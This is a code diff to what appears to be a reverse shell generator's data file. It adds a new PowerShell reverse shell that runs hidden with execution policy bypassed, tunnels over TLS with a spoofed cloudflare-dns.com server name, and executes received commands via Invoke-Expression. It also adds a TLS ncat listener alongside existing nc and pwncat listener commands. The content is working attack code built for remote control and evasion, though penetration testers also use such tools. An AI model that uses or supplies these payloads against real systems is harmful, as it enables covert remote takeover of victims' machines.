@@ -170,6 +170,11 @@ const reverseShellCommands = withCommandType(
             "meta": ["windows"]
         },
         {
+            "name": "PowerShell #4 (TLS)",
+            "command": "powershell -nop -W hidden -noni -ep bypass -c \"$TCPClient = New-Object Net.Sockets.TCPClient('{ip}', {port});$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close();exit}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()};WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()\"",
+            "meta": ["windows"]
+        },
+        {
             "name": "PowerShell #3 (Base64)",
             "meta": ["windows"]
         },
@@ -358,6 +363,7 @@ const rsgData = {
     listenerCommands: [
         ['nc', 'nc -lvnp {port}'],
         ['ncat', 'ncat -lvnp {port}'],
+        ['ncat (TLS)', 'ncat --ssl -lvnp {port}'],
         ['rlwrap + nc', 'rlwrap -cAr nc -lvnp {port}'],
         ['pwncat', 'python3 -m pwncat -lp {port}'],
         ['windows ConPty', 'stty raw -echo; (stty size; cat) | nc -lvnp {port}'],
